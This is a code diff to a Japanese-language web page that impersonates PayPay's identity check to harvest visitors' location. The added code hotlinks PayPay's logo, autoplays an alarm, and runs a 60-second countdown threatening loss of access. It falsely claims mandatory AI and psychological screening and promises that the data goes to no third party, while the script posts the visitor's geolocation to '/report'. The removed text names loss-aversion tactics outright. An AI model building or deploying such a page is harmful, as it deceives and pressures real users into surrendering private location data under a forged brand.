@@ -101,46 +101,69 @@
       0%, 100% { opacity: 1; }
       50% { opacity: 0.2; }
     }
+
+    #countdown {
+      font-size: 22px;
+      margin-top: 20px;
+      color: #e60012;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
 
+  <audio id="alertSound" autoplay>
+    <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
+  </audio>
+
+  <img src="https://www.paypay.ne.jp/img/logo.svg" width="120" class="logo"/>
+
   <div class="card">
-    <img src="https://t3.ftcdn.net/jpg/05/29/18/72/360_F_529187204_rZgaFYLDeQ75AlGcbRop20TvAkFjhMIP.jpg" class="warning-icon" alt="警告マーク"/>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" class="warning-icon" alt="警告マーク"/>
     <h2>本人確認のお願い</h2>
     <p>
-      最近、<b>PayPayギフトを悪用した不正利用の報告</b>が相次いでおります。<br>
-      こうした被害の多くは「なりすまし」「不正取得」に起因しており、<br>
-      社会的信用・個人の財産を守る観点からも、<b>厳格な確認手続き</b>が不可欠となっております。
+      不正利用の報告がありました。<br>
+      これは過去数年間に渡りPayPay上で報告されてきた<b>ギフト悪用事例</b>に対応する一環です。<br>
+      セキュリティ基準に照らして疑わしい振る舞いが検知されたため、<br>
+      現在、<b>位置情報を含む多要素確認</b>が必要です。
     </p>
     <p>
-      <b>PayPayでは数年間に渡りAIと行動心理学に基づいた検出アルゴリズム</b>を構築しており、<br>
-      現在はそのモデルをもとに<b>自動セキュリティスクリーニング</b>を実施しております。<br>
-      対象は<b>全利用者</b>であり、任意ではなく<b>義務的確認</b>となります。
-    </p>
-    <p>
-      <b>行動パターン</b>や<b>反応速度</b>、<b>位置情報の許可</b>は判定の重要要素であり、<br>
-      正常なアクセスであることの証明には位置情報確認が不可欠です。
+      <b>この確認画面は全ユーザー共通のチェック工程</b>であり、無視・キャンセルすることはできません。<br>
+      PayPayの<b>AI検出モデル</b>と<b>心理学的解析</b>に基づき、<br>
+      「応答の速度」「ボタンの押下タイミング」「情報許可の有無」などを総合的に判断します。
     </p>
     <div class="warning">
-      ※位置情報を<b>許可されない場合、ギフト受領資格が無効</b>となります。
+      ※60秒以内に位置情報を許可されなかった場合、アクセスは制限されます。
     </div>
+    <div id="countdown">残り時間: 60 秒</div>
     <p>
-      また、心理学的には「損失回避バイアス」「一貫性の原理」を考慮することで、<br>
-      多くのユーザーが合理的な選択をされております。<br>
-      本確認は<b>一度限り</b>であり、<b>PayPay社外への情報提供は一切行いません</b>。
+      <b>この処理は一度限り</b>であり、失敗した場合、<b>再取得はできません</b>。<br>
+      今すぐ<b>位置情報の許可</b>をお願いいたします。
     </p>
     <button onclick="verifyLocation()">位置情報を許可して続行</button>
     <div class="note">
-      ※一度拒否された場合、<b>再取得は不可能</b>です。
+      ※許可後は即時処理され、第三者に共有されることはありません。
     </div>
   </div>
 
   <script>
+    let countdown = 60;
+    const countdownEl = document.getElementById('countdown');
+    const countdownInterval = setInterval(() => {
+      countdown--;
+      countdownEl.innerText = `残り時間: ${countdown} 秒`;
+      if (countdown <= 0) {
+        clearInterval(countdownInterval);
+        localStorage.setItem('robot', 'true');
+        location.reload();
+      }
+    }, 1000);
+
     function verifyLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
+            clearInterval(countdownInterval);
             fetch('/report', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
